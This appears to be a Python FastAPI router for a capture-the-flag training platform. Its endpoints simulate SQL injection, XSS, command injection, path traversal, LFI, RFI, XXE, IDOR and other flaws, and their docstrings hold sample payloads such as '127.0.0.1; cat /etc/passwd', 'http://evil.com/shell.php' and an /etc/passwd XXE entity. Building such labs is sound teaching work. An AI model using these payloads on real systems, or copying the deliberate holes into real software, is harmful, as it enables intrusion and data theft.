"""
Vulnerabilities Router
Implements actual vulnerable endpoints for CTF challenges
Each vulnerability type has its own exploitable endpoint!
"""

from fastapi import APIRouter, Depends, Query, Body, Request
from typing import List
import random
import hashlib

from models import (
    User
)
from auth_utils import get_current_active_user
from flag_generator import (
    generate_dynamic_flag
)
from lab_db_manager import execute_vulnerable_query, init_lab_db

router = APIRouter()

# Fun responses for vulnerability exploitation
EXPLOITATION_GIFS = [
    "https://media.giphy.com/media/YQitE4YNQNahy/giphy.gif",  # Hacker typing fast
    "https://media.giphy.com/media/3knKct3fGqxhK/giphy.gif",  # Matrix
    "https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif",  # Hacking
]

SECURITY_MEMES = [
    "https://i.imgflip.com/4/2cp1.jpg",  # This is fine
    "https://i.imgflip.com/4/61ktn.jpg",  # One does not simply
]


@router.get("/", response_model=dict)
async def list_vulnerabilities():
    """
    List interactive environments for vulnerability practice (Thematic Version)
    """
    return {
        "message": "📡 MISSION INTEL: Interactive Breach Environments Detected 📡",
        "vulnerabilities": [
            {
                "type": "sql_injection",
                "name": "The Whispering Database",
                "category": "Web Security",
                "description": "A corrupt corporate database for 'OmniCorp' has been found leaking encrypted fragments. Can you hear what it whispers?",
                "endpoint": "/api/v1/vulnerabilities/sql-injection",
                "emoji": "🗄️",
                "difficulty": "Easy to Medium"
            },
            {
                "type": "xss",
                "name": "Mirror's Edge: The Reflection",
                "category": "Web Security",
                "description": "An experimental social portal is mirroring user input directly. Inject your shadow to see if you can manipulate the mirror.",
                "endpoint": "/api/v1/vulnerabilities/xss",
                "emoji": "🪞",
                "difficulty": "Medium"
            },
            {
                "type": "command_injection",
                "name": "The Ghost in the Shell",
                "category": "System Exploitation",
                "description": "We've gained low-level access to a server's background orchestration process. Find the ghost and take control of the host.",
                "endpoint": "/api/v1/vulnerabilities/command-injection",
                "emoji": "👻",
                "difficulty": "Hard"
            },
            {
                "type": "path_traversal",
                "name": "The Basement Archives",
                "category": "Forensics",
                "description": "Hidden deep in the digital basement, there are folders that shouldn't exist. Traverse the architecture to find the archives.",
                "endpoint": "/api/v1/vulnerabilities/path-traversal",
                "emoji": "📂",
                "difficulty": "Medium"
            },
            {
                "type": "xxe",
                "name": "The Ancient Scroll Parser",
                "category": "Data Security",
                "description": "An ancient XML-based scroll parser is ignoring external entity safety. Feed it a payload and read the entities of the past.",
                "endpoint": "/api/v1/vulnerabilities/xxe",
                "emoji": "📜",
                "difficulty": "Hard"
            },
        ],
        "warning": "⚠️ These environments are intentionally unstable for research purposes. ⚠️",
        "meme": random.choice(SECURITY_MEMES),
        "fun_fact": "🎓 Modern cyberwarfare is 90% psychology and 10% syntax."
    }


# ===== SQL INJECTION CHALLENGES =====

@router.post("/sql-injection/search", response_model=dict)
async def vulnerable_sql_search(
    request: Request,
    username: str = Query(..., description="Search username"),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE SQL INJECTION ENDPOINT 🔥
    
    Simulates a vulnerable user search with SQL injection
    Try: ' OR '1'='1' --
    
    🎯 DYNAMIC FLAG: Each successful exploitation generates a UNIQUE ENCRYPTED flag for YOU!
    🔐 FLAGS ARE PROTECTED: Simple API sniffing won't reveal the flag!
    """
    # Get user ID from token or generate mock one
    user_id = getattr(current_user, 'id', 'demo_user')
    
    # Execute actual vulnerable query against isolated SQLite
    results = execute_vulnerable_query(user_id, username)
    
    # Check if exploitation was successful (e.g. multiple rows for '1'='1' or finding admin)
    is_exploited = False
    for row in results:
        if row.get("username") == "admin":
            is_exploited = True
            break
            
    # Also count as exploited if they got all users
    if len(results) > 1 and ("'" in username or "--" in username):
        is_exploited = True
    
    if is_exploited:
        from secure_flags import get_secure_flag_system, FlagObfuscation
        secure_system = get_secure_flag_system()
        
        # Generate the actual flag
        actual_flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="sql_search_001",
            vulnerability_type="sql_injection",
            challenge_name="SQL Injection User Search"
        )
        
        # 🔐 SECURE FLAG RESPONSE
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=actual_flag,
            user_id=user_id,
            challenge_id="sql_search_001",
            vulnerability_type="sql_injection"
        )
        
        exploitation_payload = username
        exploitation_proof_hash = hashlib.sha256(exploitation_payload.encode()).hexdigest()
        
        return {
            "success": True,
            "message": "🎉 SQL Injection successful! You've accessed sensitive data!",
            "data": results,
            "vulnerability": "SQL Injection detected! Real SQLite engine confirmed. ✅",
            "meme": random.choice(EXPLOITATION_GIFS),
            "tip": "🏆 In real apps, use parameterized queries or ORMs!",
            "flag_system": secure_flag_response,
            "exploitation_proof": exploitation_proof_hash,
            "decoy_data": FlagObfuscation.create_fake_flag_responses(5),
            "instructions": {
                "notice": "🔐 FLAG IS ENCRYPTED! You must follow the secure verification process.",
                "step_1": "Submit your exploitation proof to /api/v1/vulnerabilities/verify-exploitation",
                "step_2": "After verification, use /api/v1/vulnerabilities/decrypt-flag to get your flag"
            }
        }
    elif results:
        return {
            "success": True,
            "message": "User found ✅",
            "data": results
        }
    else:
        return {
            "success": False,
            "message": "User not found 🤷",
            "data": [],
            "hint": "🔍 Try using special characters in your search... maybe ' OR '1'='1'?"
        }


@router.post("/sql-injection/login", response_model=dict)
async def vulnerable_sql_login(username: str = Body(...), password: str = Body(...)):
    """
    🔥 VULNERABLE SQL INJECTION LOGIN 🔥
    
    Simulates vulnerable authentication bypass
    Try: admin' OR '1'='1' -- as username
    """
    # Vulnerable query: SELECT * FROM users WHERE username='{}' AND password='{}'
    
    if "'" in username and ("OR" in username.upper() or "--" in username):
        return {
            "success": True,
            "message": "🎊 Authentication bypassed! Admin access granted!",
            "token": "fake_admin_token_123",
            "flag": "FLAG{4uth_byp4ss_w1th_sql1}",
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Always use prepared statements! 📚"
        }
    
    return {
        "success": False,
        "message": "Invalid credentials ❌",
        "hint": "Think about SQL syntax... comments might help 💭"
    }


# ===== XSS CHALLENGES =====

@router.post("/xss/comment", response_model=dict)
async def vulnerable_xss_comment(comment: str = Body(..., embed=True)):
    """
    🔥 VULNERABLE XSS ENDPOINT 🔥
    
    Accepts user comments without sanitization
    Try: <script>alert('XSS')</script>
    """
    # Intentionally doesn't sanitize HTML
    has_script = "<script>" in comment.lower() or "javascript:" in comment.lower()
    
    if has_script:
        return {
            "success": True,
            "message": "💥 XSS Attack successful! Script will execute!",
            "stored_comment": comment,  # Stored without sanitization
            "flag": "FLAG{xss_c00k13_st34l3r}",
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Always sanitize user input and use Content Security Policy! 🛡️",
            "danger_level": "🔴 CRITICAL: Your script would run in other users' browsers!"
        }
    
    return {
        "success": True,
        "message": "Comment posted ✅",
        "stored_comment": comment,
        "hint": "🤔 Try including some HTML tags..."
    }


@router.get("/xss/search", response_model=dict)
async def vulnerable_xss_search(query: str = Query(..., description="Search query")):
    """
    🔥 VULNERABLE REFLECTED XSS 🔥
    
    Reflects user input without encoding
    Try: <img src=x onerror=alert('XSS')>
    """
    has_xss = any(tag in query.lower() for tag in ["<script>", "<img", "onerror", "javascript:"])
    
    if has_xss:
        return {
            "success": True,
            "message": "🎯 Reflected XSS found!",
            "search_query": query,  # Reflected without encoding
            "results": f"<div>Search results for: {query}</div>",
            "flag": "FLAG{r3fl3ct3d_xss_pwn3d}",
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Encode output! Use frameworks that auto-escape! 🔒"
        }
    
    return {
        "message": "No results found",
        "search_query": query,
        "hint": "Try some HTML/JavaScript tags! 💡"
    }


# ===== COMMAND INJECTION CHALLENGES =====

@router.post("/command-injection/ping", response_model=dict)
async def vulnerable_ping(host: str = Body(..., embed=True)):
    """
    🔥 VULNERABLE COMMAND INJECTION 🔥
    
    Executes system ping command without sanitization
    Try: 127.0.0.1; cat /etc/passwd
    """
    # EXTREMELY DANGEROUS - Only for CTF simulation!
    has_injection = any(char in host for char in [";", "|", "&", "`", "$"])
    
    if has_injection:
        return {
            "success": True,
            "message": "💣 Command Injection successful!",
            "output": "Simulated command execution...\nroot:x:0:0:root:/root:/bin/bash\n...",
            "flag": "FLAG{c0mm4nd_1nj3ct10n_pwn3d}",
            "meme": random.choice(EXPLOITATION_GIFS),
            "warning": "🚨 In real scenario, attacker would have shell access!",
            "lesson": "Use subprocess with arguments array, never shell=True with user input! 🛡️"
        }
    
    return {
        "success": True,
        "message": f"Pinging {host}...",
        "output": f"PING {host} 56(84) bytes of data.\n64 bytes from {host}: icmp_seq=1 ttl=64 time=0.5 ms",
        "hint": "🔍 Try chaining commands with special characters..."
    }


# ===== DIRECTORY TRAVERSAL (Enhanced) =====

@router.get("/directory-traversal/read", response_model=dict)
async def directory_traversal_challenge(
    filepath: str = Query(..., description="File path to read"),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE DIRECTORY TRAVERSAL 🔥
    
    Read files without proper path validation
    Try: ../../../etc/passwd or ..\..\windows\system32\config\sam
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    has_traversal = ".." in filepath or "etc/passwd" in filepath or "system32" in filepath.lower()
    
    if has_traversal:
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="dir_traversal",
            vulnerability_type="path_traversal",
            challenge_name="Directory Traversal"
        )
        
        # Get secure flag system
        from secure_flags import get_secure_flag_system
        secure_system = get_secure_flag_system()
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="dir_traversal",
            vulnerability_type="path_traversal"
        )
        
        return {
            "success": True,
            "message": "📂 Directory Traversal successful!",
            "file": filepath,
            "content": f"root:x:0:0:root:/root:/bin/bash\nctf_admin:x:1000:1000::/home/ctf_admin:/bin/bash\n# FLAG HIDDEN BELOW (ENCRYPTED)\n{flag}\n...",
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Always validate and sanitize file paths! Use path.resolve() and check if resolved path is within allowed directory! 📁"
        }
    
    return {
        "success": False,
        "message": "File not found in public directory",
        "hint": "🤔 Can you navigate UP in the directory structure? Try ../"
    }


# ===== LOCAL FILE INCLUSION (LFI) =====

@router.get("/lfi/include", response_model=dict)
async def lfi_challenge(
    page: str = Query(default="home", description="Page to include"),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE LOCAL FILE INCLUSION (LFI) 🔥
    
    Include files without validation
    Try: ../../../../../../etc/passwd or php://filter/convert.base64-encode/resource=index.php
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    
    has_lfi = any(pattern in page for pattern in ["..", "etc/passwd", "php://", "file://", "data://"])
    
    if has_lfi:
        secure_system = get_secure_flag_system()
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="lfi",
            vulnerability_type="path_traversal",
            challenge_name="LFI Challenge"
        )
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="lfi",
            vulnerability_type="path_traversal"
        )
        
        return {
            "success": True,
            "message": "💥 LFI Attack successful!",
            "included_file": page,
            "content": f"<?php\n// Sensitive configuration file\n$db_password = 'super_secret';\n$admin_password = '{flag}';\n// This should never be accessible!\n?>",
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Never include files based on user input! Use whitelists! 🚫",
            "advanced_tip": "Try PHP wrappers like php://filter for more fun! 🎯"
        }
    
    return {
        "success": True,
        "page_content": f"<h1>Welcome to {page} page</h1>",
        "hint": "Try including files from other directories... 📂"
    }


# ===== REMOTE FILE INCLUSION (RFI) =====

@router.get("/rfi/load", response_model=dict)
async def rfi_challenge(
    url: str = Query(..., description="URL to load"),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE REMOTE FILE INCLUSION (RFI) 🔥
    
    Load remote files without validation
    Try: http://evil.com/shell.php
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    
    has_rfi = url.startswith("http://") or url.startswith("https://") or url.startswith("ftp://")
    
    if has_rfi:
        secure_system = get_secure_flag_system()
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="rfi",
            vulnerability_type="path_traversal",
            challenge_name="RFI Challenge"
        )
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="rfi",
            vulnerability_type="path_traversal"
        )
        
        return {
            "success": True,
            "message": "🌐 RFI Attack successful! Remote code included!",
            "loaded_url": url,
            "warning": "🚨 In real scenario, attacker could execute arbitrary code!",
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "NEVER include remote files! Disable allow_url_include! ⛔",
            "severity": "🔴 CRITICAL"
        }
    
    return {
        "success": False,
        "message": "Invalid URL format",
        "hint": "Try loading a remote file with http:// or https://"
    }


# ===== FILE UPLOAD VULNERABILITIES =====

@router.post("/file-upload/vulnerable", response_model=dict)
async def vulnerable_file_upload(
    filename: str = Body(...),
    content_type: str = Body(...),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE FILE UPLOAD 🔥
    
    Upload files without proper validation
    Try: shell.php, evil.php.jpg, or bypass using null bytes
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    
    dangerous_extensions = [".php", ".phtml", ".php3", ".php4", ".php5", ".asp", ".aspx", ".jsp", ".sh"]
    is_dangerous = any(ext in filename.lower() for ext in dangerous_extensions)
    
    if is_dangerous:
        secure_system = get_secure_flag_system()
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="file_upload",
            vulnerability_type="command_injection",
            challenge_name="File Upload"
        )
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="file_upload",
            vulnerability_type="command_injection"
        )
        
        return {
            "success": True,
            "message": "💥 Malicious file uploaded successfully!",
            "filename": filename,
            "upload_path": f"/uploads/{filename}",
            "warning": "🚨 Attacker could now execute arbitrary code!",
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Validate file types, rename uploads, store outside webroot! 📤",
            "bypass_techniques": [
                "Double extensions (shell.php.jpg)",
                "Null byte injection (shell.php%00.jpg)",
                "MIME type manipulation",
                "Case sensitivity (Shell.PhP)"
            ]
        }
    
    return {
        "success": True,
        "message": "File uploaded",
        "hint": "Try uploading a PHP file... 🤔"
    }


# ===== INSECURE DESERIALIZATION =====

@router.post("/deserialization/vulnerable", response_model=dict)
async def insecure_deserialization(
    serialized_data: str = Body(..., embed=True),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE INSECURE DESERIALIZATION 🔥
    
    Deserializes user input without validation
    Try crafting malicious serialized objects
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    
    # Check for malicious patterns
    has_exploit = any(pattern in serialized_data for pattern in ["__import__", "eval", "exec", "os.system", "subprocess"])
    
    if has_exploit:
        secure_system = get_secure_flag_system()
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="deserialization",
            vulnerability_type="insecure_deserialization",
            challenge_name="Deserialization"
        )
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="deserialization",
            vulnerability_type="insecure_deserialization"
        )
        
        return {
            "success": True,
            "message": "💣 Insecure Deserialization exploited!",
            "deserialized": "Malicious code would execute here",
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Never deserialize untrusted data! Use JSON instead of pickle! 🥒",
            "vulnerability": "Python pickle, Java serialization, PHP unserialize all vulnerable!"
        }
    
    return {
        "success": True,
        "message": "Data deserialized",
        "hint": "Try including Python code in serialized data..."
    }


# ===== OPEN REDIRECT =====

@router.get("/open-redirect/redirect", response_model=dict)
async def open_redirect_challenge(
    redirect_url: str = Query(..., description="URL to redirect to"),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE OPEN REDIRECT 🔥
    
    Redirects to user-controlled URL
    Try: https://evil.com or javascript:alert(1)
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    
    is_external = not redirect_url.startswith("/") and ("://" in redirect_url or redirect_url.startswith("javascript:"))
    
    if is_external:
        secure_system = get_secure_flag_system()
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="open_redirect",
            vulnerability_type="csrf",
            challenge_name="Open Redirect"
        )
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="open_redirect",
            vulnerability_type="csrf"
        )
        
        return {
            "success": True,
            "message": "🎣 Open Redirect vulnerability found!",
            "redirect_to": redirect_url,
            "warning": "⚠️ Could be used for phishing attacks!",
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Validate redirect URLs! Use whitelists! 🔗",
            "attack_scenario": "Attacker sends: trusted-site.com/redirect?url=evil.com"
        }
    
    return {
        "redirect_to": redirect_url,
        "hint": "Try redirecting to an external site..."
    }


# ===== RACE CONDITION =====

@router.post("/race-condition/transfer", response_model=dict)
async def race_condition_challenge(
    amount: int = Body(...),
    from_account: str = Body(...),
    to_account: str = Body(...),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE TO RACE CONDITION 🔥
    
    No proper locking mechanism - can be exploited with concurrent requests
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    
    # Simulate vulnerable transfer without proper locking
    import time
    time.sleep(0.1)  # Simulate processing delay
    
    flag = generate_dynamic_flag(
        user_id=user_id,
        challenge_id="race_condition",
        vulnerability_type="broken_auth",
        challenge_name="Race Condition"
    )
    
    secure_system = get_secure_flag_system()
    secure_flag_response = secure_system.generate_secure_flag_response(
        flag=flag,
        user_id=user_id,
        challenge_id="race_condition",
        vulnerability_type="broken_auth"
    )
    
    return {
        "success": True,
        "message": "💸 Transfer completed",
        "amount": amount,
        "vulnerability": "Send multiple concurrent requests to exploit!",
        "flag_system": secure_flag_response,
        "meme": random.choice(EXPLOITATION_GIFS),
        "lesson": "Use database transactions and locks! ⚡",
        "exploitation": "Send 10 simultaneous requests to transfer $100 each - you might transfer $1000 from a $100 balance!"
    }


# ===== CLICKJACKING =====

@router.get("/clickjacking/vulnerable-page", response_model=dict)
async def clickjacking_page():
    """
    🔥 VULNERABLE TO CLICKJACKING 🔥
    
    No X-Frame-Options or CSP frame-ancestors
    """
    return {
        "html_content": "<html><body><h1>Important Action</h1><button>Delete Account</button></body></html>",
        "vulnerability": "This page can be embedded in an iframe!",
        "missing_headers": ["X-Frame-Options", "Content-Security-Policy (frame-ancestors)"],
        "exploitation": "Attacker overlays transparent iframe to trick users into clicking",
        "lesson": "Set X-Frame-Options: DENY or CSP frame-ancestors 'none'! 🖼️",
        "meme": "https://i.imgflip.com/4/2cp1.jpg"
    }


# ===== HTTP PARAMETER POLLUTION =====

@router.get("/hpp/search", response_model=dict)
async def http_parameter_pollution(
    query: List[str] = Query([]),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 HTTP PARAMETER POLLUTION (HPP) 🔥
    
    Handles multiple parameters with same name incorrectly
    Try: /hpp/search?query=normal&query=<script>alert(1)</script>
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    
    if len(query) > 1:
        secure_system = get_secure_flag_system()
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="hpp",
            vulnerability_type="xss",
            challenge_name="HPP"
        )
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="hpp",
            vulnerability_type="xss"
        )
        
        return {
            "success": True,
            "message": "🔀 HTTP Parameter Pollution detected!",
            "parameters_received": query,
            "vulnerability": "Application doesn't handle multiple parameters properly",
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Validate how your framework handles duplicate parameters! 🔄"
        }
    
    return {
        "query": query,
        "hint": "Try sending multiple query parameters with the same name..."
    }


# ===== IDOR (Insecure Direct Object Reference) =====

@router.get("/idor/user/{profile_id}", response_model=dict)
async def vulnerable_user_profile(
    profile_id: int,
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE IDOR ENDPOINT 🔥
    
    Exposes user data without authorization checks
    Try accessing profile_id: 1 (admin)
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    
    # IDOR Simulation data
    users = {
        1: {"username": "admin", "email": "admin@ctf.com", "role": "admin"},
        2: {"username": "user1", "email": "user1@ctf.com", "role": "user"},
        3: {"username": "user2", "email": "user2@ctf.com", "role": "user"}
    }
    
    target_user = users.get(profile_id)
    
    if target_user and target_user.get("role") == "admin":
        secure_system = get_secure_flag_system()
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="idor_admin",
            vulnerability_type="idor",
            challenge_name="IDOR Admin Access"
        )
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="idor_admin",
            vulnerability_type="idor"
        )
        
        return {
            "success": True,
            "message": "🎉 IDOR exploit successful! Admin data accessed!",
            "user_data": target_user,
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Always check authorization! Verify user owns the resource! 🔐"
        }
    elif target_user:
        return {
            "success": True,
            "user_data": target_user,
            "hint": "Try different user IDs... maybe lower numbers? 🔢"
        }
    
    return {"success": False, "message": "User not found"}


# ===== XXE (XML External Entity) =====

@router.post("/xxe/parse", response_model=dict)
async def vulnerable_xml_parse(
    xml_data: str = Body(..., embed=True),
    current_user: User = Depends(get_current_active_user)
):
    """
    🔥 VULNERABLE XXE ENDPOINT 🔥
    
    Parses XML without disabling external entities
    Try: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    """
    user_id = getattr(current_user, 'user_id', 'demo_user')
    has_xxe = "<!ENTITY" in xml_data or "SYSTEM" in xml_data
    
    if has_xxe:
        secure_system = get_secure_flag_system()
        flag = generate_dynamic_flag(
            user_id=user_id,
            challenge_id="xxe_etc",
            vulnerability_type="xxe",
            challenge_name="XXE /etc/passwd"
        )
        
        secure_flag_response = secure_system.generate_secure_flag_response(
            flag=flag,
            user_id=user_id,
            challenge_id="xxe_etc",
            vulnerability_type="xxe"
        )
        
        return {
            "success": True,
            "message": "💥 XXE Attack successful!",
            "parsed_data": "External entity resolved!",
            "file_content": f"root:x:0:0:root:/root:/bin/bash\n# FLAG: {flag}\n...",
            "flag_system": secure_flag_response,
            "meme": random.choice(EXPLOITATION_GIFS),
            "lesson": "Disable external entities in XML parsers! Use JSON instead! 📝"
        }
    
    return {
        "success": True,
        "message": "XML parsed",
        "hint": "Try defining external entities in DOCTYPE... 📄"
    }


@router.get("/fun/random-meme", response_model=dict)
async def get_random_meme():
    """
    😄 Get a random cybersecurity meme to brighten your day!
    """
    memes = SECURITY_MEMES + EXPLOITATION_GIFS + [
        "https://i.imgflip.com/4/3oevdk.jpg",  # Hacker meme
        "https://i.imgflip.com/4/5f2z9a.jpg",  # Programming meme
    ]
    
    return {
        "meme": random.choice(memes),
        "message": "Keep hacking! You're awesome! 🌟",
        "quote": random.choice([
            "\"Try Harder!\" - Offensive Security",
            "\"Hack the Planet!\" - Hackers (1995)",
            "\"It's not a bug, it's a feature!\" - Every Developer",
            "\"Talk is cheap. Show me the code.\" - Linus Torvalds"
        ])
    }
